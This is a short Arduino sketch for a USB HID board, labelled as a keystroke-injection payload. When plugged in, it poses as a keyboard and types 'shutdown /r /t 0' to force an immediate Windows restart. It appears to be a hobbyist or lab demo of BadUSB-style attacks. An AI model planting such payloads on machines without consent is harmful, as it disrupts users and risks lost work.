// HID Payload 2: Restart Windows
#include "Arduino.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(2000);
    Keyboard.println("shutdown /r /t 0");
}

void loop() {}
